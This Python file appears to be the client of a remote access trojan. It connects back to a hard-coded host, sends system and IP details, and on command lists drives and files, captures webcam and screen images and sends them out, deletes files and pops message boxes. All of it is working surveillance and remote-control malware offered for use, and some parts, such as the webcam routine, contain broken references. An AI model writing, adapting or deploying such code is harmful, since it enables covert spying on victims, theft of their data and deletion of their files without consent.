import socket, os, subprocess, urllib.request, platform, sys, string, cv2, pyscreeze

try: hostname = socket.gethostname()
except (socket.error, Exception): hostname = "UNKNOWN"

try: username = os.environ["USERNAME"]
except (OSError, Exception): username = "UNKNOWN"

try: IPv4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); IPv4.connect(("8.8.8.8", 80))
except (socket.error, Exception): IPv4 = "UNKNOWN"

try: OperatingSystem = platform.system() + " " + platform.release()
except (OSError, Exception): OperatingSystem = "UNKNOWN"

try: External_IP = urllib.request.urlopen("https://ident.me").read()
except (urllib.error.URLError, Exception): External_IP = "UNKNOWN"

HOST = "192.168.0.222"
PORT = 3000

decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
recv = lambda buffer: objConn.recv(buffer)
APPDATA = os.environ["APPDATA"]

def ClearLogs():
    VBS_FILE = APPDATA+"/000.vbs"
    
    if (os.path.exists(VBS_FILE)):
        os.remove(VBS_FILE)
    else: pass

def SocketConnection():
    global objConn
    while (True):
        try:
            objConn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objConn.connect((HOST,PORT))
        except (socket.error, Exception):
            continue
        else: break
        
    INFO = "\nComputer: " + "(" + socket.gethostname() + ")" + "\nIP Address: " + "(" + IPv4.getsockname()[0] + ")"
    objConn.send(INFO.encode())

SocketConnection()

def MessageBox():
    message = objConn.recv(1024).decode()
    VBS_MSG = open(APPDATA+"/000.vbs", "w")
    VBS_MSG.write("Msgbox \"" + message + "\", vbInformation, \"[Message]\"")
    VBS_MSG.close()
    subprocess.Popen(["cscript", APPDATA+"/000.vbs"], shell=True)
    objConn.send("[Message Sent]".encode())
    
def SystemInformation():
    system = "[Computer]: <" + hostname + ">\n[Username]: <" + username + ">\n[IP Address]: <"+ IPv4.getsockname()[0] + ">\n[System]: <" + \
             OperatingSystem + ">\n[External IP]: <" + External_IP.decode() + ">"
    objConn.send(system.encode())
    
def ViewFiles(DriveChars):
    drives = ["[%s: - Drive]" % d for d in string.ascii_uppercase if os.path.exists("%s:" % d)]
    objConn.send("\n".join(drives).encode())
    
    requested_dir = objConn.recv(1024).decode()
    if (os.path.exists(requested_dir) == True):
        objConn.send("\n[Files]\n\n".encode() + "\n".join(os.listdir(requested_dir)).encode())
    else:
        objConn.send("(Invalid Directory)".encode())
        
def Webcam():
    try:
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(APPDATA+"/webcam.png", image)
        del(camera)
        objConn.send("\n[+] Model: (".encode() + model.encode() + ")\n[+] Webcam-Shot Captured Successfully\n".encode())
        WebcamImage = open(APPDATA+"/webcam.png", "rb")
        WebcamImage.send(objWebcam.read())
        WebcamImage.close()
    except (cv2.error, Exception):
        objConn.send("[-] No Webcam Detected\n".encode())
        objConn.send("@#$@#$@#$@#$".encode())
        
def Screenshot():
    try:
        pyscreeze.screenshot(APPDATA+"/screenshot.png")
        objConn.send("[+] Image Captured\n".encode())
        Screenshot = open(APPDATA+"/screenshot.png", "rb")
        objConn.send(Screenshot.read())
        Screenshot.close()
    except Exception:
        objConn.send("[-] Error Capturing Image\n".encode())
        objConn.send("@#$@#$@#$@#$".encode())
        
def DeleteFile():
    DirFile = objConn.recv(256).decode()
    if (os.path.exists(DirFile)):
        objConn.send("VALID PATH".encode())
    else:
        objConn.send("INVALID PATH".encode())
        return
        
    try:
        os.remove(DirFile)
        objConn.send("File Deleted Successfully!".encode())
    except (OSError, Exception):
        objConn.send("Error Deleting File!".encode())
        
while (True):
    try:
        ServerData = recv(1024); ServerData = decode_utf8(ServerData)
        if (ServerData == "terminate-connection"):
            ClearLogs(); objConn.close(); del(objConn); sys.exit(0)
            
        elif (ServerData == "append-connection"):
            ClearLogs(); objConn.close(); del(objConn); SocketConnection()
            
        elif (ServerData == "check-connection"):
            objConn.send("Connection is Active: ".encode() + "[".encode() + str(IPv4.getsockname()[0]).encode() + "]\n".encode())
            
        elif (ServerData == "message-box"):
            MessageBox()
            
        elif (ServerData == "get-sys"):
            SystemInformation()
            
        elif (ServerData == "shutdown-pc"):
            objConn.send("[Powering Off PC]".encode()); # os.system("shutdown /p")
            
        elif (ServerData == "restart-pc"):
            objConn.send("[Restarting PC]".encode()); # os.system("shutdown /r")
            
        elif (ServerData =="lock-pc"):
            objConn.send("[Locking PC]".encode()); # os.system("rundll32.exe user32.dll,LockWorkStation");
            
        elif (ServerData == "get-dir"):
            objConn.send(os.getcwd().encode())
            
        elif (ServerData == "view-files"):
            ViewFiles(DriveChars="ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            
        elif (ServerData == "activate-webcam"):
            Webcam()
            
        elif (ServerData == "capture-screen"):
            Screenshot()
        
        elif (ServerData == "delete-file"):
            DeleteFile()
        
    except (socket.error, Exception):
        objConn.close()
        del (objConn)
        SocketConnection()